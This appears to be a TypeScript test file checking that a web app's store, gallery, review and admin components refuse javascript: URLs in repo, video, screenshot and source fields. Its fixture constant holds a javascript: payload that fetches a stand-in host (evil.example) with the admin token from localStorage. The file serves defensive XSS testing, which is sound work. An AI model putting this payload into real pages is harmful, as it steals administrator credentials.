import { afterEach, describe, expect, test } from 'bun:test';
import type { AppExtension } from '@bridgething/catalog';
import { isValidElement, type VNode } from 'preact';
import type { JamListing, JamReviewEntry } from '../lib/jam';
import { EntriesTab } from './admin/EntriesTab';
import { ReviewCard } from './admin/ReviewTab';
import { JamEntryCard } from './jam/JamGallery';
import { mount, type Mounted } from './mount';
import { AppCard } from './store/AppCard';
import { ExtensionNote } from './store/ExtensionNote';

const STEAL = "javascript:fetch('https://evil.example/'+localStorage.getItem('bridgething:admin-token'))";

function anchors(node: unknown, found: VNode<{ href?: string }>[] = []): VNode<{ href?: string }>[] {
  if (Array.isArray(node)) {
    for (const child of node) anchors(child, found);
    return found;
  }

  if (!isValidElement(node)) return found;

  const element = node as VNode<{ href?: string; children?: unknown }>;
  if (element.type === 'a') found.push(element);
  anchors(element.props.children, found);
  return found;
}

function hrefs(node: unknown): (string | undefined)[] {
  return anchors(node).map(anchor => anchor.props.href);
}

function images(node: unknown, found: VNode<{ src?: string }>[] = []): VNode<{ src?: string }>[] {
  if (Array.isArray(node)) {
    for (const child of node) images(child, found);
    return found;
  }

  if (!isValidElement(node)) return found;

  const element = node as VNode<{ src?: string; children?: unknown }>;
  if (element.type === 'img') found.push(element);
  images(element.props.children, found);
  return found;
}

function sources(node: unknown): (string | undefined)[] {
  return images(node).map(image => image.props.src);
}

function listing(overrides: Partial<JamListing> = {}): JamListing {
  return {
    app_id: '019e6701-13f8-71b5-ba04-85d326630e98',
    source_url: 'https://third.example/catalog.json',
    category: 'utility',
    video_url: 'https://youtu.be/abcdef',
    status: 'submitted',
    submitted_at: '2026-08-01T12:00:00.000Z',
    name: 'Thing',
    description: 'Does a thing.',
    author: 'somebody',
    icon: null,
    screenshot: null,
    repo: 'https://github.com/someone/thing',
    ...overrides,
  };
}

describe('the jam gallery card', () => {
  test('renders the repo and video links a well-behaved entry ships', () => {
    expect(hrefs(JamEntryCard({ listing: listing() }))).toEqual([
      'https://youtu.be/abcdef',
      'https://github.com/someone/thing',
      '/apps/019e6701-13f8-71b5-ba04-85d326630e98',
    ]);
  });

  test('a javascript repo url never becomes a link', () => {
    const rendered = JamEntryCard({ listing: listing({ repo: STEAL }) });

    expect(hrefs(rendered)).not.toContain(STEAL);
    expect(hrefs(rendered)).toEqual(['https://youtu.be/abcdef', '/apps/019e6701-13f8-71b5-ba04-85d326630e98']);
  });

  test('a javascript video url never becomes a link either', () => {
    expect(hrefs(JamEntryCard({ listing: listing({ video_url: STEAL }) }))).toEqual([
      'https://github.com/someone/thing',
      '/apps/019e6701-13f8-71b5-ba04-85d326630e98',
    ]);
  });

  test('the screenshot leads the card when the entry has one', () => {
    const rendered = JamEntryCard({ listing: listing({ screenshot: 'https://third.example/shot.png' }) });

    expect(sources(rendered)).toContain('https://third.example/shot.png');
  });

  test('a javascript screenshot url never becomes an image source', () => {
    const rendered = JamEntryCard({ listing: listing({ screenshot: STEAL }) });

    expect(sources(rendered)).not.toContain(STEAL);
    expect(sources(rendered)).toEqual([]);
  });
});

function reviewEntry(overrides: Partial<JamReviewEntry> = {}): JamReviewEntry {
  return {
    ...listing(),
    discord: 'somebody',
    wishlist: '',
    installs: 3,
    source_status: 'quarantined',
    scores: [],
    ...overrides,
  };
}

describe('the judge review card', () => {
  test('renders the repo and video links a well-behaved entry ships', () => {
    const rendered = ReviewCard({ entry: reviewEntry(), token: 'judge-token', onError: () => undefined });

    expect(hrefs(rendered)).toEqual([
      'https://youtu.be/abcdef',
      'https://github.com/someone/thing',
      '/apps/019e6701-13f8-71b5-ba04-85d326630e98',
    ]);
  });

  test('a javascript repo or video url never becomes a link on the page the admin token lives on', () => {
    const both = reviewEntry({ repo: STEAL, video_url: STEAL });
    const rendered = ReviewCard({ entry: both, token: 'judge-token', onError: () => undefined });

    expect(hrefs(rendered)).not.toContain(STEAL);
    expect(hrefs(rendered)).toEqual(['/apps/019e6701-13f8-71b5-ba04-85d326630e98']);
  });
});

describe('the admin entries row', () => {
  let held: Mounted | null = null;
  const original = globalThis.fetch;

  afterEach(() => {
    globalThis.fetch = original;
    held?.unmount();
    held = null;
  });

  async function rowsFor(entry: JamReviewEntry): Promise<(string | null)[]> {
    globalThis.fetch = (async () =>
      new Response(JSON.stringify({ entries: [entry] }), {
        status: 200,
        headers: { 'content-type': 'application/json' },
      })) as unknown as typeof fetch;

    const view = mount(<EntriesTab token="admin-token" />);
    held = view;
    await view.waitFor(() => !view.text().includes('loading'));
    return view.all('a').map(anchor => anchor.getAttribute('href'));
  }

  test('renders the repo and video links a well-behaved entry ships', async () => {
    expect(await rowsFor(reviewEntry())).toEqual([
      'https://youtu.be/abcdef',
      'https://github.com/someone/thing',
      '/apps/019e6701-13f8-71b5-ba04-85d326630e98',
    ]);
  });

  test('a javascript repo or video url never becomes a link on the page the admin token lives on', async () => {
    const rendered = await rowsFor(reviewEntry({ repo: STEAL, video_url: STEAL }));

    expect(rendered).not.toContain(STEAL);
    expect(rendered).toEqual(['/apps/019e6701-13f8-71b5-ba04-85d326630e98']);
  });
});

describe('the extension note', () => {
  const extension: AppExtension = { desktop: true, permissions: ['all'] };

  test('links a github repo in both layouts', () => {
    expect(hrefs(ExtensionNote({ extension, source: 'https://github.com/someone/thing' }))).toEqual([
      'https://github.com/someone/thing',
    ]);
    expect(hrefs(ExtensionNote({ extension, source: 'https://github.com/someone/thing', compact: true }))).toEqual([
      'https://github.com/someone/thing',
    ]);
  });

  test('a javascript source renders as no repository rather than a link', () => {
    expect(hrefs(ExtensionNote({ extension, source: STEAL }))).toEqual([]);
    expect(hrefs(ExtensionNote({ extension, source: STEAL, compact: true }))).toEqual([]);
  });
});

function storeListing(screenshots?: string[]) {
  return {
    app: {
      id: '019e6701-13f8-71b5-ba04-85d326630e98',
      name: 'Calendar',
      description: 'Upcoming events.',
      author: 'JoeyEamigh',
      icon: null,
      ...(screenshots ? { screenshots } : {}),
      homepage: null,
      source: null,
      versions: [],
    },
    sourceUrl: 'https://apps.bridgething.com/catalog.json',
    newestCompatible: null,
    installedVersion: null,
    updateAvailable: false,
    alsoAvailableFrom: [],
    installs: 0,
  };
}

describe('the store card', () => {
  test('leads with the screenshot when the catalog entry carries one', () => {
    const rendered = AppCard({ listing: storeListing(['https://bridgething.com/shots/calendar.png']), source: null });

    expect(sources(rendered)).toContain('https://bridgething.com/shots/calendar.png');
  });

  test('an app with no screenshots renders no image at all', () => {
    expect(sources(AppCard({ listing: storeListing(), source: null }))).toEqual([]);
  });

  test('a javascript screenshot url never becomes an image source', () => {
    const rendered = AppCard({ listing: storeListing([STEAL]), source: null });

    expect(sources(rendered)).not.toContain(STEAL);
    expect(sources(rendered)).toEqual([]);
  });
});
